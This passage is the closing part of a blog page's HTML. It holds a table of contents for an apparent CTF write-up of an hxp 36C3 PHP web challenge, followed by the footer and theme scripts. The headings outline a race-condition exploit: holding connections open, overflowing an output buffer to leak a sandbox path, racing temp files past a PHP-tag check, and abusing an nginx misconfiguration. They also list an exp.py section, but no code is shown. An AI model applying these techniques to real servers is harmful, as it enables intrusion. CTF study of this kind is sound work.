class="nav-text">要利用大文件或ftp速度限制让连接保持</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#传入name过大-overflow-output-buffer，在保持连接的情况下获取沙箱路径"><span class="nav-number">1.0.3.42.</span> <span class="nav-text">传入name过大 overflow output buffer，在保持连接的情况下获取沙箱路径</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#tmp文件需要在两种文件直接疯狂切换，使得第一次file-get-contents获取的内容不带有-lt-include的时候是正常php代码，需要卡时间点，所以要多跑几次才行"><span class="nav-number">1.0.3.43.</span> <span class="nav-text">tmp文件需要在两种文件直接疯狂切换，使得第一次file_get_contents获取的内容不带有&lt;?,include的时候是正常php代码，需要卡时间点，所以要多跑几次才行</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#well-known-files-是nginx配置漏洞，就不多说了，用来列生成的tmp文件"><span class="nav-number">1.0.3.44.</span> <span class="nav-text">.well-known../files/是nginx配置漏洞，就不多说了，用来列生成的tmp文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有-hit-中一次，第二天经过-rebirth-的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以-getflag"><span class="nav-number">1.0.3.45.</span> <span class="nav-text">由于第二个极短的时间窗，我们需要比较准确地调控延迟时间，之前没调控好时间以及文件大小，挂一晚上脚本都没有 hit 中一次，第二天经过 @rebirth 的深刻指点，修改了一下延迟时间以及服务器响应的文件的大小，成功率得到了很大的提高，基本每次都可以 getflag</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exp-py"><span class="nav-number">1.0.3.46.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考的exp"><span class="nav-number">1.0.3.47.</span> <span class="nav-text">参考的exp</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#References"><span class="nav-number">1.0.4.</span> <span class="nav-text">References</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-zeddyu-info-2020-01-08-36c3-web"><span class="nav-number">1.0.4.1.</span> <span class="nav-text">https://blog.zeddyu.info/2020/01/08/36c3-web/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#20191228-hxp36c3ctf"><span class="nav-number">1.0.4.2.</span> <span class="nav-text">20191228-hxp36c3ctf</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-paste-q3k-org-paste-mp0iN5mw-xy-cOL-ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">https://paste.q3k.org/paste/mp0iN5mw#xy+cOL+ON0sWRaJ7p1NZAFkcDTM1BKkYXaq9vZthxK0</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-ctftime-org-task-10211"><span class="nav-number">1.0.4.4.</span> <span class="nav-text">https://ctftime.org/task/10211</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">141k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
